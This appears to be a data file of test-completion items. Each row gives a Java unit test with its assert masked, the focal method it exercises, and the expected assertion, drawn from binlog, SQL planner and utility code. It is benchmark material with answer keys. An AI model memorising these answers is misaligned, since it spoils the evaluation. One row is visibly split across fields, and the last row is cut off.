"testVarchar() { setConfig(ConfigKeys.TASK_EXTRACT_REBUILD_DATA_LOG, ""true""); String str = ""abcdefgh""; Field field = MakeFieldFactory.makeField(""varchar(5)"", str, ""utf8"", false, false); RowDataRebuildLogger logger = new RowDataRebuildLogger(); Serializable s = logger.doDecode(field.getMysqlType().getType(), field.doGetTableMeta(), field.encode(), ""utf8"", false); Assert.""<AssertPlaceHolder>""; }
doDecode(int type, byte[] meta, byte[] data, String charset, boolean isUnsigned) { int m = decodeMeta(type, meta); String javaCharset = CharsetConversion.getJavaCharset(charset); return logBuffer .fetchValue(type, m, false, new LogBuffer(data, 0, data.length), javaCharset, isUnsigned); }"	assertEquals(str, s)
"testCompare() { VirtualTSO last = new VirtualTSO(6798848743826568064L, 1329913957179199503L, 0); VirtualTSO curr = new VirtualTSO(6798848743826568064L, 1329913959330877442L, 4); Assert.""<AssertPlaceHolder>""; }
compareTo(VirtualTSO o) { long cmp = (tso - o.tso); if (cmp == 0) { cmp = transactionId - o.transactionId; if (cmp == 0) { cmp = seq - o.seq; } } if (cmp > 0) { return 1; } else if (cmp == 0) { return 0; } return -1; }"	assertEquals(1, curr.compareTo(last))
"test() { FilterBlacklistTableFilter filter = new FilterBlacklistTableFilter(""cdc_blacklist_db.*\\.cdc_black_table.*""); boolean flag = filter.doFilter1(""cdc_blacklist_db"", ""cdc_black_table""); Assert.""<AssertPlaceHolder>""; }
doFilter1(String dbName, String tableName) { String key = dbName + ""."" + tableName; boolean ignore = pattern.matcher(key).matches(); if (ignore) { log.warn(""detected event : "" + key + "" match black table, will ignore it""); } return ignore; }"	assertTrue(flag)
"IOException { long actual = binlogFileReadChannel.size(); long expect = localChannel.size(); Assert.""<AssertPlaceHolder>""; }
size() throws IOException { try { return parse(size.invoke(channel)); } catch (Exception e) { log.error(""invoke size method error"", e); throw new IOException(""Get size of file channel error!""); } }"	assertEquals(expect, actual)
"testEnsureTypeWithAny() { final RelDataTypeFactory typeFactory = new SqlTypeFactoryImpl(RelDataTypeSystem.DEFAULT); RexBuilder builder = new RexBuilder(typeFactory);  RexNode node =  new RexLiteral( Boolean.TRUE, typeFactory.createSqlType(SqlTypeName.BOOLEAN), SqlTypeName.BOOLEAN); RexNode ensuredNode = builder.ensureType( typeFactory.createSqlType(SqlTypeName.ANY), node, true);  ""<AssertPlaceHolder>""; }
ensureType( RelDataType type, RexNode node, boolean matchNullability) { RelDataType targetType = type; if (matchNullability) { targetType = matchNullability(type, node); }  if (targetType.getSqlTypeName() == SqlTypeName.ANY && (!matchNullability || targetType.isNullable() == node.getType().isNullable())) { return node; }  //    if (!node.getType().equals(targetType)) { //      if (node instanceof RexInputRef) { //        RexInputRef ref = (RexInputRef) node; //        return new RexInputRef(ref.getIndex(), targetType); //      } else { //        return makeCast(targetType, node); //      } //    } return node; }"	assertEquals(node, ensuredNode)
"testEnsureTypeWithItself() { final RelDataTypeFactory typeFactory = new SqlTypeFactoryImpl(RelDataTypeSystem.DEFAULT); RexBuilder builder = new RexBuilder(typeFactory);  RexNode node =  new RexLiteral( Boolean.TRUE, typeFactory.createSqlType(SqlTypeName.BOOLEAN), SqlTypeName.BOOLEAN); RexNode ensuredNode = builder.ensureType( typeFactory.createSqlType(SqlTypeName.BOOLEAN), node, true);  ""<AssertPlaceHolder>""; }
ensureType( RelDataType type, RexNode node, boolean matchNullability) { RelDataType targetType = type; if (matchNullability) { targetType = matchNullability(type, node); }  if (targetType.getSqlTypeName() == SqlTypeName.ANY && (!matchNullability || targetType.isNullable() == node.getType().isNullable())) { return node; }  //    if (!node.getType().equals(targetType)) { //      if (node instanceof RexInputRef) { //        RexInputRef ref = (RexInputRef) node; //        return new RexInputRef(ref.getIndex(), targetType); //      } else { //        return makeCast(targetType, node); //      } //    } return node; }"	assertEquals(node, ensuredNode)
"try { final RelBuilder builder = RelBuilder.create(config().build()); RelBuilder root = builder.values((String[]) null, ""a"", ""b""); fail(""expected error, got "" + root); } catch (IllegalArgumentException e) { ""<AssertPlaceHolder>""; }
build() { return stack.pop().rel; }"	"assertThat(e.getMessage(), is(""Value count must be a positive multiple of field count""))"
"try { final RelBuilder builder = RelBuilder.create(config().build()); RelBuilder root = builder.values(new String[0], 1, 2, 3); fail(""expected error, got "" + root); } catch (IllegalArgumentException e) { ""<AssertPlaceHolder>""; }
build() { return stack.pop().rel; }"	"assertThat(e.getMessage(), is(""Value count must be a positive multiple of field count""))"
"try { final RelBuilder builder = RelBuilder.create(config().build()); RelBuilder root = builder.values(new String[] {""a"", ""b""}, 1, 2, 3, 4, 5); fail(""expected error, got "" + root); } catch (IllegalArgumentException e) { ""<AssertPlaceHolder>""; }
build() { return stack.pop().rel; }"	"assertThat(e.getMessage(), is(""Value count must be a positive multiple of field count""))"
"try { final RelBuilder builder = RelBuilder.create(config().build()); RelBuilder root = builder.values(new String[] {""a"", ""b""}, null, null, 1, null); fail(""expected error, got "" + root); } catch (IllegalArgumentException e) { ""<AssertPlaceHolder>""; cannot deduce type"")); }
build() { return stack.pop().rel; }"	"assertThat(e.getMessage(), is(""All values of field 'b' are null"
"Exception { final SchemaPlus rootSchema = Frameworks.createRootSchema(true); final FrameworkConfig config = Frameworks.newConfigBuilder() .defaultSchema( CalciteAssert.addSchema(rootSchema, CalciteAssert.SchemaSpec.HR)) .build(); final Planner planner = Frameworks.getPlanner(config); SqlNode parse = planner.parse(""select * from ""emps"" ""); SqlNode val = planner.validate(parse);  String valStr = val.toSqlString(AnsiSqlDialect.DEFAULT, false).getSql();  String expandedStr = ""SELECT `emps`.`empid`, `emps`.`deptno`, `emps`.`name`, `emps`.`salary`, `emps`.`commission`\n"" + ""FROM `hr`.`emps` AS `emps`""; ""<AssertPlaceHolder>""; }
getPlanner(FrameworkConfig config) { return new PlannerImpl(config); }"	assertThat(Util.toLinux(valStr), equalTo(expandedStr))
"Exception { Program program0 = Programs.ofRules( FilterMergeRule.INSTANCE, EnumerableRules.ENUMERABLE_FILTER_RULE, EnumerableRules.ENUMERABLE_PROJECT_RULE);  JdbcConvention out = new JdbcConvention(null, null, ""myjdbc""); Program program1 = Programs.ofRules( new MockJdbcProjectRule(out), new MockJdbcTableRule(out));  Planner planner = getPlanner(null, program0, program1); SqlNode parse = planner.parse(""select T1.""name"" from ""emps"" as T1 "");  SqlNode validate = planner.validate(parse); RelNode convert = planner.rel(validate).project();  RelTraitSet traitSet0 = planner.getEmptyTraitSet() .replace(EnumerableConvention.INSTANCE);  RelTraitSet traitSet1 = planner.getEmptyTraitSet() .replace(out);  RelNode transform = planner.transform(0, traitSet0, convert); RelNode transform2 = planner.transform(1, traitSet1, transform); ""<AssertPlaceHolder>""; }
transform(int ruleSetIndex, RelTraitSet requiredOutputTraits, RelNode rel) throws RelConversionException;  /** * Resets this {@code Planner}"	"assertThat(toString(transform2), equalTo(""JdbcProject(name=[$2])\n"" + ""  MockJdbcTableScan(table=[[hr, emps]])\n""))"
"""<AssertPlaceHolder>"";
previousClearBit(BitSet bitSet, int fromIndex) { if (fromIndex < -1) { throw new IndexOutOfBoundsException(); } while (fromIndex >= 0) { if (!bitSet.get(fromIndex)) { return fromIndex; } --fromIndex; } return -1; }"	assertThat(BitSets.previousClearBit(BitSets.of(), 10), equalTo(10))
"""<AssertPlaceHolder>"";
of() { return EMPTY; }"	assertThat(ImmutableBitSet.valueOf(0L), equalTo(ImmutableBitSet.of()))
"""<AssertPlaceHolder>"";
isDistinct(List<E> list) { return firstDuplicate(list) < 0; }"	assertTrue(Util.isDistinct(Collections.emptyList()))
"""<AssertPlaceHolder>"";
firstDuplicate(List<E> list) { final int size = list.size(); if (size < 2) { // Lists of size 0 and 1 are always distinct. return -1; } if (size < 15) { // For smaller lists, avoid the overhead of creating a set. Threshold // determined empirically using UtilTest.testIsDistinctBenchmark. for (int i = 1; i < size; i++) { E e = list.get(i); for (int j = i - 1; j >= 0; j--) { E e1 = list.get(j); if (Objects.equals(e, e1)) { return i; } } } return -1; } final Map<E, Object> set = new HashMap<>(size); for (E e : list) { if (set.put(e, """") != null) { return set.size(); } } return -1; }"	assertThat(Util.firstDuplicate(ImmutableList.of()), equalTo(-1))
"""<AssertPlaceHolder>"";
startsWith(List<E> list0, List<E> list1) { if (list0 == list1) { return true; } final int size = list1.size(); if (list0.size() < size) { return false; } for (int i = 0; i < size; i++) { if (!Objects.equals(list0.get(i), list1.get(i))) { return false; } } return true; }"	"assertThat(Util.startsWith(list(""x""), list()), is(true))"
"""<AssertPlaceHolder>"";
human(double d) { if (d == 0d) { return ""0""; } if (d < 0d) { return ""-"" + human(-d); } final int digitCount = (int) Math.floor(Math.log10(d)); switch (digitCount) { case 0: case 1: case 2: return Integer.toString((int) d); case 3: case 4: case 5: return digits3(Math.round(d / 10D), digitCount % 3) + ""K""; case 6: case 7: case 8: return digits3(Math.round(d / 10000D), digitCount % 3) + ""M""; case 9: case 10: case 11: return digits3(Math.round(d / 10000000D), digitCount % 3) + ""G""; default: return Double.toString(d); } }"	"assertThat(Util.human(0D), equalTo(""0""))"
"testMatchPodIpFromLocalHost() { Assert.""<AssertPlaceHolder>""; }
tryMatchFromLocalHost(String podIp) { try { InetAddress localHost = InetAddress.getLocalHost(); if (isValidHostAddress(localHost) && podIp.equalsIgnoreCase(localHost.getHostAddress())) { return localHost; } } catch (Throwable e) { // just ignore this } return null; }"	assertNull(AddressUtils.tryMatchFromLocalHost(MOCK_IP))
"test() { IntStream.range(0, 1 << 10).forEach( i -> { // convert from sql mode to flag String sqlModeStr = randomSqlModeStr(); long flag = SQLMode.convertToFlag(sqlModeStr);  // check all sql mode SQLMode.convertFromFlag(flag).forEach( sqlMode -> Assert.""<AssertPlaceHolder>""; } ); }
getModeFlag() { return sqlModeFlag; }"	assertTrue((flag & sqlMode.getModeFlag()) != 0) )
"InterruptedException { TddlRuntimeException nestRuntimeException = new TddlRuntimeException(ErrorCode.ERR_DUPLICATE_KEY, ""test msg5""); TddlRuntimeException tddlRuntimeException4 = new TddlRuntimeException(ErrorCode.ERR_DDL_JOB_FAILED, nestRuntimeException, ""test msg6""); System.out.println(tddlRuntimeException4.getMessage()); tddlRuntimeException4.printStackTrace(); Assert.""<AssertPlaceHolder>""; }
getMessage() { if (vendorCode > 0) { return super.getMessage(); } else { return super.getMessage(); } }"	"assertTrue(tddlRuntimeException4.getMessage().contains(""ERR_DDL_JOB_FAILED""))"
"testGetRaw() { List list = Lists.newLinkedList(); list.add(""string""); list.add(""1""); list.add(3); list.add(""s\n""); list.add(""s\rt""); list.add(""s't""); list.add(""s""t""); RawString rawString = new RawString(list); System.out.println(rawString); Assert.""<AssertPlaceHolder>""; }
buildRawString() { if (raw != null) { return raw; } StringBuilder stringBuilder = new StringBuilder(); for (Object o : objList) { stringBuilder.append(objectToRawString(o)); } if (stringBuilder.length() >= 1) { stringBuilder.setLength(stringBuilder.length() - 1); } raw = stringBuilder.toString(); return raw; }"	"assertTrue(rawString.buildRawString().equals(""'string','1',3,'s\\n','s\\rt','s\'t','s""t'""))"
"testRawStringWithNull() { List list = Lists.newLinkedList(); list.add(""string""); list.add(""1""); list.add(3); list.add(null); list.add(""s\n""); list.add(""s\rt""); list.add(""s't""); list.add(""s""t""); RawString rawString = new RawString(list); System.out.println(rawString); System.out.println(rawString.buildRawString()); BitSet b = new BitSet(); b.set(1); b.set(3); b.set(4); b.set(6); System.out.println(rawString.buildRawString(b)); System.out.println(rawString.display()); Assert.""<AssertPlaceHolder>""; }
buildRawString() { if (raw != null) { return raw; } StringBuilder stringBuilder = new StringBuilder(); for (Object o : objList) { stringBuilder.append(objectToRawString(o)); } if (stringBuilder.length() >= 1) { stringBuilder.setLength(stringBuilder.length() - 1); } raw = stringBuilder.toString(); return raw; }"	"assertTrue(rawString.buildRawString().equals(""'string','1',3,null,'s\\n','s\\rt','s\'t','s""t'""))"
"testAddEarlyExecInfo() { StatementSummaryByDigest statementSummaryByDigest = new StatementSummaryByDigest(SCHEMA, TEMPLATE_HASH, PLAN_HASH, SQL_SAMPLE, SQL_TEMPLATE_TEXT, SQL_TYPE, PREV_TEMPLATE_HASH, PREV_SAMPLE_SQL, SAMPLE_TRACE_ID, WORKLOAD_TYPE, EXECUTE_MODE); ExecInfo execInfo = new ExecInfo(); execInfo.setTimestamp(1636537498974L); execInfo.setSchema(SCHEMA); execInfo.setSqlType(SQL_TYPE); execInfo.setSampleSql(SQL_SAMPLE); execInfo.setPrevTemplateText(PREV_SAMPLE_SQL); execInfo.setTemplateText(SQL_TEMPLATE_TEXT); execInfo.setSampleTraceId(SAMPLE_TRACE_ID); execInfo.setWorkloadType(WORKLOAD_TYPE); execInfo.setExecuteMode(EXECUTE_MODE); execInfo.setTemplateHash(TEMPLATE_HASH); execInfo.setPrevTemplateHash(PREV_TEMPLATE_HASH); execInfo.setPlanHash(PLAN_HASH); execInfo.setErrorCount(0); execInfo.setAffectedRows(1); execInfo.setTransTime(2); execInfo.setResponseTime(3); execInfo.setPhysicalTime(4); execInfo.setPhysicalExecCount(5); int historySize = 16; int refreshInterval = 20; statementSummaryByDigest.add(execInfo, historySize, refreshInterval); execInfo.setTimestamp(1636537498974L + refreshInterval); statementSummaryByDigest.add(execInfo, historySize, refreshInterval); execInfo.setTimestamp(1636537498974L); statementSummaryByDigest.add(execInfo, historySize, refreshInterval); Assert.""<AssertPlaceHolder>""; }
next() { return data[(endIndex - (remainingCount--) + capacity) % capacity]; }"	assertTrue(statementSummaryByDigest.iterator().next().getCount() == 2)
"testArrayTrieConcurrently() { final int count = 10000; final int parallelism = 20; List<String> list = new ArrayList<>(count); for (int i = 0; i < count; i++) { list.add(RandomStringUtils.random(6, true, false)); }  Set<String> nameSet = Collections.synchronizedSortedSet(new TreeSet<>(String.CASE_INSENSITIVE_ORDER)); for (int i = 0; i < count; i += 10) { nameSet.add(list.get(i)); } ArrayTrie arrayTrie = null; try { arrayTrie = ArrayTrie.buildTrie(nameSet, true, count); } catch (Exception e) { Assert.fail(e.getMessage()); }   List<String> errors = Collections.synchronizedList(new ArrayList<>()); CountDownLatch countDownLatch = new CountDownLatch(parallelism); for (int i = 0; i < parallelism; i++) { ArrayTrie finalArrayTrie = arrayTrie; new Thread(() -> { try { for (int j = 0; j < count; j += parallelism) { String s = list.get(j);  testSameContainResult(nameSet, finalArrayTrie, s); testSameContainResult(nameSet, finalArrayTrie, s.substring(3)); testSameContainResult(nameSet, finalArrayTrie, s + ""suffix""); testSameContainResult(nameSet, finalArrayTrie, s.toLowerCase()); testSameContainResult(nameSet, finalArrayTrie, s.toUpperCase()); } } catch (Throwable e) { errors.add(e.getMessage() + ""\n""); } finally { countDownLatch.countDown(); } }).start(); } try { if (!countDownLatch.await(10, TimeUnit.SECONDS)) { Assert.fail(""Trie test timeout""); } } catch (InterruptedException e) { e.printStackTrace(); } Assert.""<AssertPlaceHolder>""; }
add(String s) { if (s == null || s.length() == 0) { throw new IllegalArgumentException(""cannot add empty String in ArrayTrie""); }  int t = 0, last = 0; int len = s.length(); for (int k = 0; k < len; k++) { char ch = s.charAt(k); if (this.caseInsensitive && ch < 128) { ch = lowercases[ch]; }  while (true) { int row = ROW_SIZE * t;  if (t == rowCount) { if (isFull()) { return false; } rowCount++; tree[row] = ch; }  char n = tree[row]; int diff = n - ch; if (diff == 0) { last = row + EQUAL; } else if (diff < 0) { last = row + LOW; } else { last = row + HIGH; }  t = tree[last]; if (t == 0) { t = rowCount; tree[last] = (char) t; }  if (diff == 0) { break; } } }  if (t == rowCount) { if (isFull()) { return false; } rowCount++; }  setBit(t); return true; }"	"assertTrue(StringUtils.join(errors, ""\n""), errors.isEmpty())"
"IOException { final Random random = new Random(System.currentTimeMillis()); final int round = 100; for (int i = 0; i < round; i++) { MysqlDateTime mysqlDateTime = new MysqlDateTime(random.nextInt(2000), random.nextInt(12), random.nextInt(30), random.nextInt(24), random.nextInt(60), random.nextInt(60), random.nextInt(100)); byte[] expectedBytes = mysqlDateTime.toDatetimeString(0).getBytes(); byte[] fastBytes = mysqlDateTime.fastToDatetimeBytes(0); Assert.""<AssertPlaceHolder>""; } }
fastToDatetimeBytes(int scale) throws IOException { ByteArrayOutputStream timestampByteBuf = new ByteArrayOutputStream(20); byte[] yearBytes = fastGetSmallLongBytesForDate(year, 4); byte[] monthBytes = fastGetSmallLongBytesForDate(month, 2); byte[] dayBytes = fastGetSmallLongBytesForDate(day, 2); byte[] hourBytes = fastGetSmallLongBytesForDate(hour, 2); byte[] minuteBytes = fastGetSmallLongBytesForDate(minute, 2); byte[] secondBytes = fastGetSmallLongBytesForDate(second, 2); byte[] nanosecondBytes; String nanosecondString; String zeros = ""000000000"";  if (secondPart == 0) { nanosecondBytes = null; } else { nanosecondString = Long.toString(secondPart); if (nanosecondString.length() <= 9) { // Add leading zeros nanosecondString = zeros.substring(0, (9 - nanosecondString.length())) + nanosecondString; }  // Truncate trailing zeros char[] nanosChar = new char[nanosecondString.length()]; nanosecondString.getChars(0, nanosecondString.length(), nanosChar, 0); int truncIndex = 8; while (nanosChar[truncIndex] == '0') { truncIndex--; }  nanosecondBytes = new String(nanosChar, 0, truncIndex + 1).getBytes(); }  if (isNeg) { timestampByteBuf.write('-'); } timestampByteBuf.write(yearBytes); timestampByteBuf.write('-'); timestampByteBuf.write(monthBytes); timestampByteBuf.write('-'); timestampByteBuf.write(dayBytes); timestampByteBuf.write(' '); timestampByteBuf.write(hourBytes); timestampByteBuf.write(':'); timestampByteBuf.write(minuteBytes); timestampByteBuf.write(':'); timestampByteBuf.write(secondBytes);  if (nanosecondBytes != null) { //  for nanosecond != 0 int nanoLen = nanosecondBytes.length; timestampByteBuf.write('.'); timestampByteBuf.write(nanosecondBytes);  // append '0' if (scale > nanoLen) { for (int i = nanoLen; i < scale; i++) { timestampByteBuf.write('0'); } } } else if (scale > 0) { timestampByteBuf.write('.'); // for nanosecond = 0 but scale > 0 for (int i = 0; i < scale; i++) { timestampByteBuf.write('0'); } }  return timestampByteBuf.toByteArray(); }"	"assertArrayEquals(""Failed at "" + mysqlDateTime, expectedBytes, fastBytes)"
"NoSuchAlgorithmException { byte[] mysqlUserPassword = SecurityUtil.calcMysqlUserPassword(pwd.getBytes()); byte[] token = SecurityUtil.scramble411(pwd.getBytes(), scramble.getBytes()); ""<AssertPlaceHolder>""; }
verify(byte[] token, byte[] mysqlUserPassword, byte[] scramble) throws NoSuchAlgorithmException { MessageDigest md = MessageDigest.getInstance(""SHA-1""); md.update(scramble); byte[] stage1_hash = md.digest(mysqlUserPassword); for (int i = 0; i < stage1_hash.length; i++) { stage1_hash[i] = (byte) (stage1_hash[i] ^ token[i]); }  md.reset(); byte[] candidate_hash2 = md.digest(stage1_hash); boolean match = true;  if (mysqlUserPassword.length != candidate_hash2.length) { match = false; }  for (int i = 0; i < candidate_hash2.length; i++) { if (candidate_hash2[i] != mysqlUserPassword[i]) { match = false; break; } }  return match; }"	assertTrue(SecurityUtil.verify(token, mysqlUserPassword, scramble.getBytes()))
"NoSuchAlgorithmException { byte[] mysqlUserPassword = SecurityUtil.calcMysqlUserPassword(""go2hell"".getBytes()); ""<AssertPlaceHolder>""; }
byte2HexStr(byte[] b) { StringBuilder hs = new StringBuilder(); for (int n = 0; n < b.length; n++) { String hex = (Integer.toHexString(b[n] & 0XFF)); if (hex.length() == 1) { hs.append(""0"" + hex); } else { hs.append(hex); } }  return hs.toString(); }"	"assertTrue(""2E6558E64F7FD60426931B09CD962F2789D5F1FC"".equalsIgnoreCase(SecurityUtil.byte2HexStr(mysqlUserPassword)))"
"testDeadLock_bucketPool() { int count = 20; final ServerThreadPool executor = new ServerThreadPool(""test"", count, 1000, 4);  final long start = System.currentTimeMillis(); for (int i = 0; i < count; i++) { final String name = RandomStringUtils.randomAlphabetic(4); executor.submit(name, name, new Callable<Boolean>() {  @Override public Boolean call() throws Exception { Thread.sleep(100); System.out.println(""init ""); return true; } }); }  final CountDownLatch latch = new CountDownLatch(count); for (int i = 0; i < count; i++) { final String name = RandomStringUtils.randomAlphabetic(4); executor.submit(name, name, new Callable<Boolean>() {  @Override public Boolean call() throws Exception { Thread.sleep(1000); // 再次派生一个线程 Future future = executor.submit(name, name, new Runnable() {  @Override public void run() { try { System.out.println(""next start""); Thread.sleep(2000); } catch (InterruptedException e) { e.printStackTrace(); } } }); System.out.println(""waiting next""); future.get(); latch.countDown(); return true; } }); }  try { latch.await(); } catch (InterruptedException e) { Assert.fail(ExceptionUtils.getFullStackTrace(e)); }  long cost = System.currentTimeMillis() - start; System.out.println(cost); try { Thread.sleep(2000L); } catch (InterruptedException e) { e.printStackTrace(); }  Assert.""<AssertPlaceHolder>""; }
getPoolSize() { if (executorBuckets != null) { int poolSize = 0; for (ThreadPoolExecutor executor : executorBuckets) { poolSize += executor.getCorePoolSize(); } return poolSize; } else { return executor.getCorePoolSize(); } }"	assertTrue(executor.getPoolSize() == count)
"testDeadLock() { int count = 20; final ServerThreadPool executor = new ServerThreadPool(""test"", count, 1000);  final long start = System.currentTimeMillis(); for (int i = 0; i < count; i++) { final String name = RandomStringUtils.randomAlphabetic(4); executor.submit(name, name, new Callable<Boolean>() {  @Override public Boolean call() throws Exception { Thread.sleep(100); System.out.println(""init ""); return true; } }); }  final CountDownLatch latch = new CountDownLatch(count); for (int i = 0; i < count; i++) { final String name = RandomStringUtils.randomAlphabetic(4); executor.submit(name, name, new Callable<Boolean>() {  @Override public Boolean call() throws Exception { Thread.sleep(1000); // 再次派生一个线程 Future future = executor.submit(name, name, new Runnable() {  @Override public void run() { try { System.out.println(""next start""); Thread.sleep(2000); } catch (InterruptedException e) { e.printStackTrace(); } } }); System.out.println(""waiting next""); future.get(); latch.countDown(); return true; } }); }  try { latch.await(); } catch (InterruptedException e) { Assert.fail(ExceptionUtils.getFullStackTrace(e)); }  long cost = System.currentTimeMillis() - start; System.out.println(cost); try { Thread.sleep(2000L); } catch (InterruptedException e) { e.printStackTrace(); }  Assert.""<AssertPlaceHolder>""; }
getPoolSize() { if (executorBuckets != null) { int poolSize = 0; for (ThreadPoolExecutor executor : executorBuckets) { poolSize += executor.getCorePoolSize(); } return poolSize; } else { return executor.getCorePoolSize(); } }"	assertTrue(executor.getPoolSize() == count)
"testParsingWithRound() { long[] result = new long[3]; IntStream.range(0, 1 << 10) .mapToObj(i -> generateDecimal()) .forEach( bytes -> { StringNumericParser.parseStringWithRound(bytes, 0, bytes.length, false, result); String actual = String.valueOf(result[StringNumericParser.NUMERIC_INDEX]); String expect = new BigDecimal(new String(bytes)).setScale(0, RoundingMode.HALF_UP).toPlainString(); Assert.""<AssertPlaceHolder>""; } ); }
parseStringWithRound(byte[] bytes, final int startPos, final int endPos, final boolean isUnsigned, long[] results) { int pos = startPos;  while (pos < endPos && (bytes[pos] == ' ' || bytes[pos] == '\t')) { pos++; }  if (pos >= endPos) {  results[NUMERIC_INDEX] = 0; results[ERROR_INDEX] = MY_ERRNO_EDOM; results[POSITION_INDEX] = pos; return; }  boolean isNeg; if ((isNeg = (bytes[pos] == '-')) || (bytes[pos] == '+')) { if (++pos == endPos) { results[NUMERIC_INDEX] = 0; results[ERROR_INDEX] = MY_ERRNO_EDOM; results[POSITION_INDEX] = pos; return; } }  int begin = pos; int nextEnd = (pos + 9) > endPos ? endPos : (pos + 9);  int value; int intResult; long longResult; for (intResult = 0; pos < nextEnd && (value = bytes[pos] - '0') < 10 && value >= 0; pos++) { intResult = intResult * 10 + value; }  if (pos >= endPos) { if (isNeg) { if (isUnsigned) { results[NUMERIC_INDEX] = 0; results[ERROR_INDEX] = MY_ERRNO_ERANGE; results[POSITION_INDEX] = pos; return; } else { results[NUMERIC_INDEX] = -(long) intResult; results[ERROR_INDEX] = 0; results[POSITION_INDEX] = pos; return; } } else { results[NUMERIC_INDEX] = intResult; results[ERROR_INDEX] = 0; results[POSITION_INDEX] = pos; return; } }  int digits = pos - begin; int dotPos = 0; int addOn = 0; int shift = 0; boolean needHandleExp = false; longResult = intResult;  for (; pos < endPos; pos++) { if ((value = bytes[pos] - '0') < 10 && value >= 0) { if (UnsignedLongs.compare(longResult, CUT_OFF) < 0 || (UnsignedLongs.compare(longResult, CUT_OFF) == 0 && UnsignedLongs.compare(value, CUT_LIM) <= 0)) { longResult = longResult * 10 + value; digits++; continue; }  if (UnsignedLongs.compare(longResult, CUT_OFF) == 0) { longResult = UNSIGNED_LONG_MAX; addOn = 1; pos++; } else { addOn = (bytes[pos] - '5') >= 0 ? 1 : 0; } if (dotPos == 0) { for (; pos < endPos && (value = bytes[pos] - '0') < 10 && value >= 0; shift++, pos++) { if (pos < endPos && Byte.toUnsignedInt(bytes[pos]) == '.') { pos++; while (pos < endPos && (value = bytes[pos] - '0') < 10 && value >= 0) { pos++; } } } } else { shift = dotPos - pos; while (pos < endPos && (value = bytes[pos] - '0') < 10 && value >= 0) { pos++; } }  needHandleExp = true; break; }  if (bytes[pos] == '.') { if (dotPos != 0) {  addOn = 0;  needHandleExp = true; break; } else { dotPos = pos + 1; } continue; }  break; } if (!needHandleExp) {  shift = dotPos != 0 ? (dotPos - pos) : 0; addOn = 0; }  if (digits == 0) { pos = begin;  results[NUMERIC_INDEX] = 0; results[ERROR_INDEX] = MY_ERRNO_EDOM; results[POSITION_INDEX] = pos; return; }  if (pos < endPos && (bytes[pos] == 'e' || bytes[pos] == '+')) { pos++; if (pos < endPos) { long exponent; boolean isNegativeExp = bytes[pos] == '-'; if (isNegativeExp || bytes[pos] == '+') { if (++pos == endPos) {  handleResult(isUnsigned, results, pos, isNeg, longResult); return; } } for (exponent = 0; pos < endPos && (value = bytes[pos] - '0') < 10 && value >= 0; pos++) { if (exponent <= (SIGNED_MAX_LONG - value) / 10) { exponent = exponent * 10 + value; } else { // too big handleRetTooBig(results, isUnsigned, isNeg, pos); return; } } shift += isNegativeExp ? -exponent : exponent; } }  if (shift == 0) { if (addOn != 0) { if (UnsignedLongs.compare(longResult, UNSIGNED_LONG_MAX) == 0) { // too big handleRetTooBig(results, isUnsigned, isNeg, pos); return; } longResult++; }  handleResult(isUnsigned, results, pos, isNeg, longResult); return; }  if (shift < 0) { long d, r; if (shift == SIGNED_INT_32_MIN || -shift >= DIGITS_IN_UNSIGNED_LONG) {  results[NUMERIC_INDEX] = 0; results[ERROR_INDEX] = 0; results[POSITION_INDEX] = pos; return; } d = D_10[-shift]; r = UnsignedLongs.remainder(longResult, d) * 2; longResult = UnsignedLongs.divide(longResult, d); if (UnsignedLongs.compare(r, d) >= 0) { longResult++; }  handleResult(isUnsigned, results, pos, isNeg, longResult); return; }  if (shift > DIGITS_IN_UNSIGNED_LONG) { if (longResult == 0) {  handleResult(isUnsigned, results, pos, isNeg, longResult); return; } // too big handleRetTooBig(results, isUnsigned, isNeg, pos); return; }  for (; shift > 0; shift--, longResult *= 10) { if (UnsignedLongs.compare(longResult, CUT_OFF) > 0) { // Overflow, number too big handleRetTooBig(results, isUnsigned, isNeg, pos); return; } }  handleResult(isUnsigned, results, pos, isNeg, longResult);  }"	"assertTrue(actual.equals(expect), ""original bytes = "" + new String(bytes) + "", actual = "" + actual + "", expect = "" + expect)"
"testParsingWithRoundMinus() { long[] result = new long[3]; IntStream.range(0, 1 << 10) .mapToObj(i -> generateDecimal()) .forEach( bytes -> { // change to negative number byte[] newBytes = new byte[bytes.length + 1]; newBytes[0] = '-'; System.arraycopy(bytes, 0, newBytes, 1, bytes.length);  StringNumericParser.parseStringWithRound(newBytes, 0, newBytes.length, false, result); String actual = String.valueOf(result[StringNumericParser.NUMERIC_INDEX]); String expect = new BigDecimal(new String(newBytes)).setScale(0, RoundingMode.HALF_UP).toPlainString(); Assert.""<AssertPlaceHolder>""; } ); }
parseStringWithRound(byte[] bytes, final int startPos, final int endPos, final boolean isUnsigned, long[] results) { int pos = startPos;  while (pos < endPos && (bytes[pos] == ' ' || bytes[pos] == '\t')) { pos++; }  if (pos >= endPos) {  results[NUMERIC_INDEX] = 0; results[ERROR_INDEX] = MY_ERRNO_EDOM; results[POSITION_INDEX] = pos; return; }  boolean isNeg; if ((isNeg = (bytes[pos] == '-')) || (bytes[pos] == '+')) { if (++pos == endPos) { results[NUMERIC_INDEX] = 0; results[ERROR_INDEX] = MY_ERRNO_EDOM; results[POSITION_INDEX] = pos; return; } }  int begin = pos; int nextEnd = (pos + 9) > endPos ? endPos : (pos + 9);  int value; int intResult; long longResult; for (intResult = 0; pos < nextEnd && (value = bytes[pos] - '0') < 10 && value >= 0; pos++) { intResult = intResult * 10 + value; }  if (pos >= endPos) { if (isNeg) { if (isUnsigned) { results[NUMERIC_INDEX] = 0; results[ERROR_INDEX] = MY_ERRNO_ERANGE; results[POSITION_INDEX] = pos; return; } else { results[NUMERIC_INDEX] = -(long) intResult; results[ERROR_INDEX] = 0; results[POSITION_INDEX] = pos; return; } } else { results[NUMERIC_INDEX] = intResult; results[ERROR_INDEX] = 0; results[POSITION_INDEX] = pos; return; } }  int digits = pos - begin; int dotPos = 0; int addOn = 0; int shift = 0; boolean needHandleExp = false; longResult = intResult;  for (; pos < endPos; pos++) { if ((value = bytes[pos] - '0') < 10 && value >= 0) { if (UnsignedLongs.compare(longResult, CUT_OFF) < 0 || (UnsignedLongs.compare(longResult, CUT_OFF) == 0 && UnsignedLongs.compare(value, CUT_LIM) <= 0)) { longResult = longResult * 10 + value; digits++; continue; }  if (UnsignedLongs.compare(longResult, CUT_OFF) == 0) { longResult = UNSIGNED_LONG_MAX; addOn = 1; pos++; } else { addOn = (bytes[pos] - '5') >= 0 ? 1 : 0; } if (dotPos == 0) { for (; pos < endPos && (value = bytes[pos] - '0') < 10 && value >= 0; shift++, pos++) { if (pos < endPos && Byte.toUnsignedInt(bytes[pos]) == '.') { pos++; while (pos < endPos && (value = bytes[pos] - '0') < 10 && value 